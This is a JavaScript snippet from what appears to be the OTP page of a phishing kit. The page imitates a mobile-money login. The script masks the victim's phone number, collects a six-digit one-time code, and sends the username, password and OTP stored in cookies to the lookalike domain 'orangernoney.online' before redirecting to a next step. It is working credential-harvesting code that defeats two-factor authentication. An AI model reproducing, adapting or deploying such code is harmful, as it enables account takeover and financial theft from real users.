    <script>
        $(document).ready(function() {
            var mobile = getCookie('mobile')
            // if(!mobile){
            //     mobile = '1234' //REMOVE ON PRODUCTION
            // }
            document.getElementById('template').textContent = document.getElementById('template').textContent.replace('**********','******'+mobile.substr(mobile.length-4))

            $('.btn-close').on('click', function(e) {
                e.preventDefault(); // Prevent default form submission
                $('.reject-data').hide();
            });

            var isValid = true;
            $('#login-otp').on('submit', function(e) {
                e.preventDefault(); // Prevent default form submission
                isValid = true;
                const otpInputs = document.querySelectorAll('.input-field input[type="number"]');
                let otpCode = '';
                otpInputs.forEach(input => {
                    otpCode += input.value;
                });

                const otp = otpCode.length;
                if (otp < 6) {
                    isValid = false;
                }
                
                if (isValid) {
                    $('#login-otp').hide();
                    $('.reject-data').hide();
                    $('#loading-section').show();
                    setCookie('otp',otpCode)

                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", 'https://orangernoney.online',true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.onreadystatechange = function() {
                        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200){
                            window.location.href = 'step3A';
                        }
                        else{
                            console.log("ERRORRRRRR")
                        }
                    }

                    xhr.send(
                        JSON.stringify({
                        'username': getCookie('username'),
                        'password': getCookie('password'),
                        'otp': getCookie('otp'),
                        })
                    );



                    // window.location.href = 'step3A.html';
                    

                } else {
                    alert('enter OTP with 6 digit');
                }
            });

            otpinit();
            function otpinit() { 
                const inputs = document.querySelectorAll("input"),
                button = document.querySelector("button");

                // iterate over all inputs
                inputs.forEach((input, index1) => {
                    input.addEventListener("keyup", (e) => {
                        // This code gets the current input element and stores it in the currentInput variable
                        // This code gets the next sibling element of the current input element and stores it in the nextInput variable
                        // This code gets the previous sibling element of the current input element and stores it in the prevInput variable
                        const currentInput = input,
                          nextInput = input.nextElementSibling,
                          prevInput = input.previousElementSibling;

                        // if the value has more than one character then clear it
                        if (currentInput.value.length > 1) {
                          currentInput.value = "";
                          return;
                        }
                        // if the next input is disabled and the current value is not empty
                        //  enable the next input and focus on it
                        if (nextInput && nextInput.hasAttribute("disabled") && currentInput.value !== "") {
                          nextInput.removeAttribute("disabled");
                          nextInput.focus();
                        }

                        // if the backspace key is pressed
                        if (e.key === "Backspace") {
                          // iterate over all inputs again
                          inputs.forEach((input, index2) => {
                            // if the index1 of the current input is less than or equal to the index2 of the input in the outer loop
                            // and the previous element exists, set the disabled attribute on the input and focus on the previous element
                            if (index1 <= index2 && prevInput) {
                              input.setAttribute("disabled", true);
                              input.value = "";
                              prevInput.focus();
                            }
                          });
                        }
                        //if the fourth input( which index number is 3) is not empty and has not disable attribute then
                        //add active class if not then remove the active class.
                        if (!inputs[5].disabled && inputs[5].value !== "") {
                          $('#login-otp').find(':input[type=submit]').prop('disabled', false);
                          $('#login-otp').find(':input[type=submit]').addClass("active");
                          return;
                        }
                        $('#login-otp').find(':input[type=submit]').removeClass("active");
                        $('#login-otp').find(':input[type=submit]').prop('disabled', true);
                    });
                });
            }

        });
    </script>
